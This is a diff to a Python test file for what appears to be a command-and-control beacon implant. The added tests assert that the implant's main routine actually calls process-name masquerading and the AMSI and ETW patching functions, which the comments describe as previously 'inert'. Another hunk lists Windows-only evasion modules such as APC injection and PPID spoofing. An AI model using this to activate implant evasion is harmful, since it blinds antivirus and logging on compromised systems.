@@ -49,6 +49,24 @@ class TestEvasionPosix(unittest.TestCase):
         self.assertIn("prctl(PR_SET_NAME", self.h)
         self.assertIn("<sys/prctl.h>", self.h)
 
+    def test_masquerade_is_actually_wired(self):
+        # rename_process() was defined on every platform (Windows PEB
+        # `FullDllName` rewrite, Linux/Android prctl) and documented in
+        # docs/beacon_platform_matrix.md, but never CALLED — so the whole
+        # capability was inert. beacon_main must invoke it, once.
+        main = _read("main.cpp")
+        self.assertIn("anti::masquerade::rename_process(", main)
+
+    def test_amsi_and_etw_patching_is_actually_wired(self):
+        # patch_amsi()/patch_etw() have REAL Windows implementations
+        # (AmsiScanBuffer / EtwEventWrite patches) and the platform matrix
+        # declares both as a Windows capability — yet neither was ever
+        # CALLED, so the documented capability was inert. beacon_main must
+        # invoke both, under the same anti-analysis gate as the rest.
+        main = _read("main.cpp")
+        self.assertIn("anti::patch_amsi();", main)
+        self.assertIn("anti::patch_etw();", main)
+
 
 class TestSharedDefensiveDetection(unittest.TestCase):
     def setUp(self):
@@ -158,7 +176,7 @@ class TestAndroidParity(unittest.TestCase):
 class TestWindowsOnlyConceptsAreDocumented(unittest.TestCase):
     """These have no POSIX analogue and must stay inside #ifdef _WIN32."""
 
-    WINDOWS_ONLY = ("stack_spoof.h", "syscalls.h", "apc_injection.h",
+    WINDOWS_ONLY = ("syscalls.h", "apc_injection.h",
                     "smb.h", "ppid_spoof.h", "sleep_ekko.h",
                     "winhttp_dynamic.h", "wasapi_capture.h")
 
